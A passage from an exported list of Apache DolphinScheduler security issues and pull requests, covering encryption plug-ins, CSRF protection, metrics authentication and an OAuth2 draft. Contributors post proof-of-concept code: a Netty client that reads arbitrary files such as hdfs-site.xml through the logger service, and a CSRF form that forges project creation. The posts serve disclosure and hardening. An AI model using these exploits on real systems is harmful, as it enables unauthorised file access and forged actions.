                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information, version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-31T01:58:32Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1409629255"
                    },
                    {
                        "body": "\"DS interval\" is not mean security. Due DS is a distributed system，\"DS interval\" is actually based on network communications which can be attacked easily;",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:16:07Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410246438"
                    },
                    {
                        "body": "The following code will shows how the `Logger Service` can be easily attacked ，without any restrictions；\r\n",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:16:13Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410246560"
                    },
                    {
                        "body": "```java\r\n    public static void main(String[] args) throws InterruptedException {\r\n        EventLoopGroup group = new NioEventLoopGroup();\r\n            Bootstrap b = new Bootstrap();\r\n            b.group(group)\r\n                    .channel(NioSocketChannel.class)\r\n                    .handler(new ChannelInitializer<SocketChannel>() {\r\n                        @Override\r\n                        public void initChannel(SocketChannel ch) throws Exception {\r\n                            ChannelPipeline p = ch.pipeline();\r\n                            p.addLast(new NettyDecoder(), new EchoMsgHandler());\r\n                        }\r\n                    });\r\n            // Start the client.\r\n            ChannelFuture f = b.connect(\"127.0.0.1\", 1234).sync();\r\n            Channel channel = f.channel();\r\n\r\n        // access /opt/hadoop/hdfs-site.xml\r\n        byte[] bytes = {-66, 0, 6, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 12, 123, 34, 105, 116, 101, 109, 115, 34, 58, 123, 125, 125, 0, 0, 0, 36, 123, 34, 112, 97, 116, 104, 34, 58, 34, 47, 111, 112, 116, 47, 104, 97, 100, 111, 111, 112, 47, 104, 100, 102, 115, 45, 115, 105, 116, 101, 46, 120, 109, 108, 34, 125};\r\n        ByteBuf mockAttackRequest = Unpooled.wrappedBuffer(bytes);\r\n        channel.writeAndFlush(mockAttackRequest);\r\n    }\r\n```\r\n\r\n>The  `bytes` array is the command to view  `/opt/hadoop/hdfs-site.xml`  file. And the `bytes` array  can easily be constructed by a few codes;\r\n\r\nThrough the above code,  you will get `/opt/hadoop/hdfs-site.xml` file which is not a log file from the `Master` or `Worker`； That means a hacker can access any file at any position; \r\n\r\n\"DS interval\" can be easily broken on network communications ;\r\n\r\n\r\n\r\n",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:35:42Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410270368"
                    },
                    {
                        "body": "@ruanwenjun ",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:43:57Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410281143"
                    },
                    {
                        "body": "> ```java\r\n>     public static void main(String[] args) throws InterruptedException {\r\n>         EventLoopGroup group = new NioEventLoopGroup();\r\n>             Bootstrap b = new Bootstrap();\r\n>             b.group(group)\r\n>                     .channel(NioSocketChannel.class)\r\n>                     .handler(new ChannelInitializer<SocketChannel>() {\r\n>                         @Override\r\n>                         public void initChannel(SocketChannel ch) throws Exception {\r\n>                             ChannelPipeline p = ch.pipeline();\r\n>                             p.addLast(new NettyDecoder(), new EchoMsgHandler());\r\n>                         }\r\n>                     });\r\n>             // Start the client.\r\n>             ChannelFuture f = b.connect(\"127.0.0.1\", 1234).sync();\r\n>             Channel channel = f.channel();\r\n> \r\n>         // access /opt/hadoop/hdfs-site.xml\r\n>         byte[] bytes = {-66, 0, 6, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 12, 123, 34, 105, 116, 101, 109, 115, 34, 58, 123, 125, 125, 0, 0, 0, 36, 123, 34, 112, 97, 116, 104, 34, 58, 34, 47, 111, 112, 116, 47, 104, 97, 100, 111, 111, 112, 47, 104, 100, 102, 115, 45, 115, 105, 116, 101, 46, 120, 109, 108, 34, 125};\r\n>         ByteBuf mockAttackRequest = Unpooled.wrappedBuffer(bytes);\r\n>         channel.writeAndFlush(mockAttackRequest);\r\n>     }\r\n> ```\r\n> \r\n> > The  `bytes` array is the command to view  `/opt/hadoop/hdfs-site.xml`  file. And the `bytes` array  can easily be constructed by a few codes;\r\n> \r\n> Through the above code, you will get `/opt/hadoop/hdfs-site.xml` file which is not a log file from the `Master` or `Worker`； That means a hacker can access any file at any position;\r\n> \r\n> \"DS interval\" can be easily broken on network communications ;\r\n\r\nI have send the detail of this attacked example to `private@dolphinscheduler.apache.org`. @zhongjiajie",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-03T07:12:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1415192912"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13245",
                "title": "[Feature][security]Users can choose Dolphinscheduler 's encryption algorithm",
                "labels": [
                    "improvement",
                    "security"
                ],
                "user": "hdygxsj",
                "issue_author_association": "CONTRIBUTOR",
                "number": 13245,
                "id": 1506331936,
                "state": "closed",
                "project_created_at": "2022-12-21T13:53:56Z",
                "closed_at": "2023-12-07T16:40:38Z",
                "body": "### Search before asking\r\n\r\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\r\n\r\n\r\n### Description\r\n\r\nBecause each company may have its own encryption standards, for example, some companies may use rsa or aes, Chinese banks or state-owned enterprises may require the use of sm4, otherwise they will be audited, and some companies may have their own encryption algorithms, so I suggest that Dolphin Dispatch can support users to choose the encryption standard they need, or put their own encryption plug-in when deploying.\r\nThe encryption algorithm will be used in the following scenarios:\r\n1.  Encrypt spring configuration\r\n2.  Encrypt the password stored in the database\r\n3.  Encrypt the configuration information in the task\r\n4.  Encrypt passwords when transmitting them to the front and back ends\r\n\r\n### Are you willing to submit a PR?\r\n\r\n- [X] Yes I am willing to submit a PR!\r\n\r\n### Code of Conduct\r\n\r\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\r\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-12-21T13:54:24Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1361340116"
                    },
                    {
                        "body": "can you show more detail about how in config the security method, especially custom plugin from user define",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-23T01:39:27Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1363518583"
                    },
                    {
                        "body": "> can you show more detail about how in config the security method, especially custom plugin from user define\r\n\r\nI have time to do this now, can we use spi and define some interfaces and provide default implementations. As for how to allow users to customize, my idea is to add a plugin directory and let Dolphin Scheduler go to the plugin directory to load the jar in the plugin directory at startup.\r\n",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-09-19T12:02:53Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1725374712"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/12931",
                "title": "[Improvement][Security] Add CSRF protection",
                "labels": [
                    "UI",
                    "improvement",
                    "backend",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12931,
                "id": 1453084338,
                "state": "open",
                "project_created_at": "2022-11-17T10:21:27Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\n* Currently, we do not have CSRF protecting for form submission and we haven't enabled `CSRF` of Spring Security. We could enable it and improve the front end at the same time by adding `CSRF-token` to protect `DS` from `CSRF` attack.\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-11-17T10:22:02Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1318411602"
                    },
                    {
                        "body": "https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-17T11:29:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1318497594"
                    },
                    {
                        "body": "please assign to me if no one is implementing it @EricGao888 ",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-28T14:15:52Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1329186601"
                    },
                    {
                        "body": "> please assign to me if no one is implementing it @EricGao888\r\n\r\n@hdygxsj Great! Thanks for helping out : )",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-28T14:32:54Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1329214027"
                    },
                    {
                        "body": "At present, the following technical details need to be discussed\r\n**1.Whether it is necessary to introduce spring security dependencies on the back end to make dolphinscheduler safe from csrf attacks**\r\nThe spring security csrf module does the following\r\n* If the cookie in the request does not contain a CSRF-TOKEN, a CSRF-TOKEN is generated and a set cookie is added to the request\r\n\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n                CsrfToken csrfToken = this.tokenRepository.loadToken(request);\r\n\t\tboolean missingToken = (csrfToken == null);\r\n\t\tif (missingToken) {\r\n\t\t\tcsrfToken = this.tokenRepository.generateToken(request);\r\n\t\t\tthis.tokenRepository.saveToken(csrfToken, request, response);\r\n\t\t}\r\n```\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CookieCsrfTokenRepository</div>\r\n\r\n```java\r\n        @Override\r\n\tpublic void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {\r\n\t\tString tokenValue = (token != null) ? token.getToken() : \"\";\r\n\t\tCookie cookie = new Cookie(this.cookieName, tokenValue);\r\n\t\tcookie.setSecure((this.secure != null) ? this.secure : request.isSecure());\r\n\t\tcookie.setPath(StringUtils.hasLength(this.cookiePath) ? this.cookiePath : this.getRequestContext(request));\r\n\t\tcookie.setMaxAge((token != null) ? this.cookieMaxAge : 0);\r\n\t\tcookie.setHttpOnly(this.cookieHttpOnly);\r\n\t\tif (StringUtils.hasLength(this.cookieDomain)) {\r\n\t\t\tcookie.setDomain(this.cookieDomain);\r\n\t\t}\r\n\t\tresponse.addCookie(cookie);\r\n\t}\r\n```\r\n* Determine whether the request path needs to be protected by CSRF\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n              if (!this.requireCsrfProtectionMatcher.matches(request)) {\r\n\t\t\tif (this.logger.isTraceEnabled()) {\r\n\t\t\t\tthis.logger.trace(\"Did not protect against CSRF since request did not match \"\r\n\t\t\t\t\t\t+ this.requireCsrfProtectionMatcher);\r\n\t\t\t}\r\n\t\t\tfilterChain.doFilter(request, response);\r\n\t\t\treturn;\r\n\t\t}\r\n```\r\n* Compare the CSRF token in the cookie with the CSRF token in the http request header or the token in the http request param\r\n<div align=\"center\"> code snippet in org.springframework.security.web.csrf.CsrfFilter</div>\r\n\r\n```java\r\n               String actualToken = request.getHeader(csrfToken.getHeaderName());\r\n\t\tif (actualToken == null) {\r\n\t\t\tactualToken = request.getParameter(csrfToken.getParameterName());\r\n\t\t}\r\n\t\tif (!equalsConstantTime(csrfToken.getToken(), actualToken)) {\r\n\t\t\tthis.logger.debug(\r\n\t\t\t\t\tLogMessage.of(() -> \"Invalid CSRF token found for \" + UrlUtils.buildFullRequestUrl(request)));\r\n\t\t\tAccessDeniedException exception = (!missingToken) ? new InvalidCsrfTokenException(csrfToken, actualToken)\r\n\t\t\t\t\t: new MissingCsrfTokenException(actualToken);\r\n\t\t\tthis.accessDeniedHandler.handle(request, response, exception);\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tfilterChain.doFilter(request, response);\r\n```\r\n\r\nIf we don't introduce spring security in the future, we can also implement csrf defense by adding a filter similar to CsrfFilter\r\n\r\n**2.How do we save the csrf token to prevent attackers from stealing it**\r\n* Whether we implement interceptors ourselves on the back end or use spring security, on the front end we need to think about how to store csrf tokens securely to prevent attackers from stealing them so that csrf defenses fail.\r\n\r\nI found that after calling the login interface, the front end would save the sessionId returned after successful login into the cookie again, and the cookie saved in this way instead of the set-cookie in the http response header would be stolen by other websites\r\n\r\n<div align=\"center\"> code snippet in use-login.ts</div>\r\n\r\n```ts\r\n  const handleLogin = () => {\r\n    state.loginFormRef.validate(async (valid: any) => {\r\n      if (!valid) {\r\n        const loginRes: LoginRes = await login({ ...state.loginForm })\r\n        debugger\r\n        await userStore.setSessionId(loginRes.sessionId)\r\n        await userStore.setSecurityConfigType(loginRes.securityConfigType)\r\n        cookies.set('sessionId', loginRes.sessionId, { path: '/' })\r\n       ……\r\n      }\r\n    })\r\n  }\r\n```\r\n\r\nThis results in an attacker using the following code for a csrf attack, as shown below\r\n```tsx\r\nimport { defineComponent, ref } from \"vue\";\r\nimport cookies from 'js-cookie'\r\n\r\nexport default defineComponent({\r\n  setup() {\r\n    const csrfToken = cookies.get('XSRF-TOKEN')\r\n    return {\r\n      csrfToken\r\n    }\r\n  },\r\n  render() {\r\n    return (<div><form action=\"http://127.0.0.1:5173/dolphinscheduler/projects\" method=\"post\">\r\n      <input type=\"hidden\"\r\n        name=\"projectName\"\r\n        value=\"aasdasd\" />\r\n      <input type=\"hidden\"\r\n        name=\"userName\"\r\n        value=\"admin\" />\r\n      <input type=\"submit\"\r\n        value=\"Win Money!\" />\r\n      <input type=\"hidden\" name=\"_csrf\" value={this.csrfToken}></input>\r\n    </form></div>)\r\n  }\r\n})\r\n```\r\n![1671536386598](https://user-images.githubusercontent.com/35210666/208658487-6c8f9d6d-3072-4d3c-beee-442a06b9181c.png)\r\n\r\nOnce the dolphinscheduler user clicks the button in the diagram, a csrf attack completes\r\n\r\n![1671536625047](https://user-images.githubusercontent.com/35210666/208659235-10bcfbc8-95ef-4a83-bd71-5a99a1b18555.png)\r\n\r\nMaybe we can save the csrf token in pinia, but I'm not sure there is any risk that pinia will be stolen by other websites\r\n\r\n* In order to make csrf token more secure, do we need to consider the encryption of csrf token?\r\n\r\nThe front end places the csrf token in the header or parameter. The back end uses the public key to decrypt the csrf Token in the http request and compares it to the token in the cookie\r\n\r\n**3.Whether to perform csrf defense on login requests**\r\n\r\nAs mentioned in spring security, an attacker can forge login requests to obtain csrf token for subsequent attacks, but our login api must input the username and password.    In my opinion, when the attacker has obtained the username and password, he can directly log in from the website, at this point, the csrf defense is meaningless\r\n\r\n\r\n",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-20T12:54:46Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1359312576"
                    },
                    {
                        "body": "> At present, the following technical details need to be discussed **1.Whether it is necessary to introduce spring security dependencies on the back end to make dolphinscheduler safe from csrf attacks** The spring security csrf module does the following\r\n> \r\n> * If the cookie in the request does not contain a CSRF-TOKEN, a CSRF-TOKEN is generated and a set cookie is added to the request\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>                 CsrfToken csrfToken = this.tokenRepository.loadToken(request);\r\n> \t\tboolean missingToken = (csrfToken == null);\r\n> \t\tif (missingToken) {\r\n> \t\t\tcsrfToken = this.tokenRepository.generateToken(request);\r\n> \t\t\tthis.tokenRepository.saveToken(csrfToken, request, response);\r\n> \t\t}\r\n> ```\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CookieCsrfTokenRepository\r\n> ```java\r\n>         @Override\r\n> \tpublic void saveToken(CsrfToken token, HttpServletRequest request, HttpServletResponse response) {\r\n> \t\tString tokenValue = (token != null) ? token.getToken() : \"\";\r\n> \t\tCookie cookie = new Cookie(this.cookieName, tokenValue);\r\n> \t\tcookie.setSecure((this.secure != null) ? this.secure : request.isSecure());\r\n> \t\tcookie.setPath(StringUtils.hasLength(this.cookiePath) ? this.cookiePath : this.getRequestContext(request));\r\n> \t\tcookie.setMaxAge((token != null) ? this.cookieMaxAge : 0);\r\n> \t\tcookie.setHttpOnly(this.cookieHttpOnly);\r\n> \t\tif (StringUtils.hasLength(this.cookieDomain)) {\r\n> \t\t\tcookie.setDomain(this.cookieDomain);\r\n> \t\t}\r\n> \t\tresponse.addCookie(cookie);\r\n> \t}\r\n> ```\r\n> \r\n> * Determine whether the request path needs to be protected by CSRF\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>               if (!this.requireCsrfProtectionMatcher.matches(request)) {\r\n> \t\t\tif (this.logger.isTraceEnabled()) {\r\n> \t\t\t\tthis.logger.trace(\"Did not protect against CSRF since request did not match \"\r\n> \t\t\t\t\t\t+ this.requireCsrfProtectionMatcher);\r\n> \t\t\t}\r\n> \t\t\tfilterChain.doFilter(request, response);\r\n> \t\t\treturn;\r\n> \t\t}\r\n> ```\r\n> \r\n> * Compare the CSRF token in the cookie with the CSRF token in the http request header or the token in the http request param\r\n> \r\n> code snippet in org.springframework.security.web.csrf.CsrfFilter\r\n> ```java\r\n>                String actualToken = request.getHeader(csrfToken.getHeaderName());\r\n> \t\tif (actualToken == null) {\r\n> \t\t\tactualToken = request.getParameter(csrfToken.getParameterName());\r\n> \t\t}\r\n> \t\tif (!equalsConstantTime(csrfToken.getToken(), actualToken)) {\r\n> \t\t\tthis.logger.debug(\r\n> \t\t\t\t\tLogMessage.of(() -> \"Invalid CSRF token found for \" + UrlUtils.buildFullRequestUrl(request)));\r\n> \t\t\tAccessDeniedException exception = (!missingToken) ? new InvalidCsrfTokenException(csrfToken, actualToken)\r\n> \t\t\t\t\t: new MissingCsrfTokenException(actualToken);\r\n> \t\t\tthis.accessDeniedHandler.handle(request, response, exception);\r\n> \t\t\treturn;\r\n> \t\t}\r\n> \t\tfilterChain.doFilter(request, response);\r\n> ```\r\n> \r\n> If we don't introduce spring security in the future, we can also implement csrf defense by adding a filter similar to CsrfFilter\r\n> \r\n> **2.How do we save the csrf token to prevent attackers from stealing it**\r\n> \r\n> * Whether we implement interceptors ourselves on the back end or use spring security, on the front end we need to think about how to store csrf tokens securely to prevent attackers from stealing them so that csrf defenses fail.\r\n> \r\n> I found that after calling the login interface, the front end would save the sessionId returned after successful login into the cookie again, and the cookie saved in this way instead of the set-cookie in the http response header would be stolen by other websites\r\n> \r\n> code snippet in use-login.ts\r\n> ```ts\r\n>   const handleLogin = () => {\r\n>     state.loginFormRef.validate(async (valid: any) => {\r\n>       if (!valid) {\r\n>         const loginRes: LoginRes = await login({ ...state.loginForm })\r\n>         debugger\r\n>         await userStore.setSessionId(loginRes.sessionId)\r\n>         await userStore.setSecurityConfigType(loginRes.securityConfigType)\r\n>         cookies.set('sessionId', loginRes.sessionId, { path: '/' })\r\n>        ……\r\n>       }\r\n>     })\r\n>   }\r\n> ```\r\n> \r\n> This results in an attacker using the following code for a csrf attack, as shown below\r\n> \r\n> ```tsx\r\n> import { defineComponent, ref } from \"vue\";\r\n> import cookies from 'js-cookie'\r\n> \r\n> export default defineComponent({\r\n>   setup() {\r\n>     const csrfToken = cookies.get('XSRF-TOKEN')\r\n>     return {\r\n>       csrfToken\r\n>     }\r\n>   },\r\n>   render() {\r\n>     return (<div><form action=\"http://127.0.0.1:5173/dolphinscheduler/projects\" method=\"post\">\r\n>       <input type=\"hidden\"\r\n>         name=\"projectName\"\r\n>         value=\"aasdasd\" />\r\n>       <input type=\"hidden\"\r\n>         name=\"userName\"\r\n>         value=\"admin\" />\r\n>       <input type=\"submit\"\r\n>         value=\"Win Money!\" />\r\n>       <input type=\"hidden\" name=\"_csrf\" value={this.csrfToken}></input>\r\n>     </form></div>)\r\n>   }\r\n> })\r\n> ```\r\n> \r\n> ![1671536386598](https://user-images.githubusercontent.com/35210666/208658487-6c8f9d6d-3072-4d3c-beee-442a06b9181c.png)\r\n> \r\n> Once the dolphinscheduler user clicks the button in the diagram, a csrf attack completes\r\n> \r\n> ![1671536625047](https://user-images.githubusercontent.com/35210666/208659235-10bcfbc8-95ef-4a83-bd71-5a99a1b18555.png)\r\n> \r\n> Maybe we can save the csrf token in pinia, but I'm not sure there is any risk that pinia will be stolen by other websites\r\n> \r\n> * In order to make csrf token more secure, do we need to consider the encryption of csrf token?\r\n> \r\n> The front end places the csrf token in the header or parameter. The back end uses the public key to decrypt the csrf Token in the http request and compares it to the token in the cookie\r\n> \r\n> **3.Whether to perform csrf defense on login requests**\r\n> \r\n> As mentioned in spring security, an attacker can forge login requests to obtain csrf token for subsequent attacks, but our login api must input the username and password. In my opinion, when the attacker has obtained the username and password, he can directly log in from the website, at this point, the csrf defense is meaningless\r\n\r\nFor question 2，Pinia will store `csrfToken ` in localStorage and will not be stolen by other websites. Your attack succeeded because you deployed them on the same domain -- `127.0.0.1`.",
                        "user": "devosend",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-04T11:26:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1370806088"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/12563",
                "title": "[Improvement][Security] Enable authentication for metrics url",
                "labels": [
                    "improvement",
                    "priority:high",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12563,
                "id": 1425078848,
                "state": "open",
                "project_created_at": "2022-10-27T06:01:17Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\n* Currently, users could get the list of DS metrics without login by sending a get request to `http://ip:12345/dolphinscheduler/actuator/prometheus`, which may lead to potential security problems.\n\n### Are you willing to submit a PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-10-27T06:06:50Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12563#issuecomment-1293037941"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/12549",
                "title": "[Feature][Authenticator] Add OAuth2 authenticator ",
                "labels": [
                    "feature",
                    "backend",
                    "don't merge",
                    "miss:docs",
                    "security",
                    "miss:ui",
                    "miss:tests"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12549,
                "id": 1423781992,
                "state": "closed",
                "project_created_at": "2022-10-26T10:17:45Z",
                "closed_at": "2022-11-30T07:36:13Z",
                "body": "## Purpose of the pull request\r\n\r\n* Still WIP, just a draft, a few things need to be fixed.\r\n\r\n* This PR closes: #11242 \r\n\r\n## Brief change log\r\n\r\n* Add OAuth2 authenticator \r\n\r\n## Verify this pull request\r\n\r\n* WIP",
                "comments": [
                    {
                        "body": "Hello, I'm trying to add a new authenticator for DS to support OAuth2.0. Currently I'm blocked by some kind of cookie missing issue. After calling `http://localhost:12345/dolphinscheduler/testlogin/google`, I get successfully redirected to google login page and completedthe OAuth process. I could see the `sessionId` in browser.\r\n![image](https://user-images.githubusercontent.com/34905992/198209678-92d3422e-9a13-45db-a21f-df39aebc421b.png)\r\nHowever, if I try to visit `http://localhost:12345/dolphinscheduler/ui/projects`, the `sessionId` is missing and I get blocked by `LoginHandlerInterceptor`. I'm wondering whether it is caused by the wrong path or some other stuff related to cookie since I haven't implemented the front-end part of `/testlogin/google`\r\n\r\nSo I have two questions:\r\n\r\n1. Am I supposed to handle the cookie path in front-end part so that the cookie added by back-end could be sent to /ui/**?\r\n2. Since Spring Boot has its default interceptor for OAuth2.0, should I disabled `ds LoginHandlerInterceptor` when using OAuth2.0?\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-ui/src/views/login/index.tsx#L35-L52\r\n\r\nRelated information:\r\n\r\nAfter authentication, ds will put `sessionId` into cookies and check the `sessionId` in `preHandle` method of `LoginHandlerInterceptor`, as shown below:\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/security/impl/AbstractAuthenticator.java#L82-L100\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/interceptor/LoginHandlerInterceptor.java#L69-L74\r\n\r\nAs we could see in `LoginController`, the url for login is `/login` and will be mapped to `/ui/login` https://github.com/apache/dolphinscheduler/blob/53340fc07b1e7b6d5f76aeb015fc36eb661e4a32/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/controller/LoginController.java#L83\r\n\r\nBut in my test code, I added a new url for login which is `/testlogin/google` without front-end. And it could not be mapped to `/ui/testlogin/google`.\r\n![image](https://user-images.githubusercontent.com/34905992/198208457-7799366c-3b62-41ac-8f5b-a91e60d4c8b1.png)\r\n\r\n@kezhenxu94 @devosend Could u plz help take a look when available? Thanks!",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-10-27T06:50:55Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1293072548"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#12549](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (53340fc) into [dev](https://codecov.io/gh/apache/dolphinscheduler/commit/70aef3ec21aa712f1f499f7b9b56bdb6b803d654?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (70aef3e) will **decrease** coverage by `0.32%`.\n> The diff coverage is `39.10%`.\n\n> :exclamation: Current head 53340fc differs from pull request most recent head bbe3bd3. Consider uploading reports for the commit bbe3bd3 to get more accurate results\n\n```diff\n@@             Coverage Diff              @@\n##                dev   #12549      +/-   ##\n============================================\n- Coverage     39.38%   39.05%   -0.33%     \n+ Complexity     4214     4175      -39     \n============================================\n  Files          1040     1044       +4     \n  Lines         39158    39289     +131     \n  Branches       4482     4501      +19     \n============================================\n- Hits          15423    15346      -77     \n- Misses        21958    22208     +250     \n+ Partials       1777     1735      -42     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/dolphinscheduler/pull/12549?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [...in/alert/dingtalk/DingTalkAlertChannelFactory.java](https://codecov.io/gh/apache/dolphinscheduler/pull/12549/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1hbGVydC9kb2xwaGluc2NoZWR1bGVyLWFsZXJ0LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1hbGVydC1kaW5ndGFsay9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvZG9scGhpbnNjaGVkdWxlci9wbHVnaW4vYWxlcnQvZGluZ3RhbGsvRGluZ1RhbGtBbGVydENoYW5uZWxGYWN0b3J5LmphdmE=) | `98.79% <ø> (ø)` | |\n| 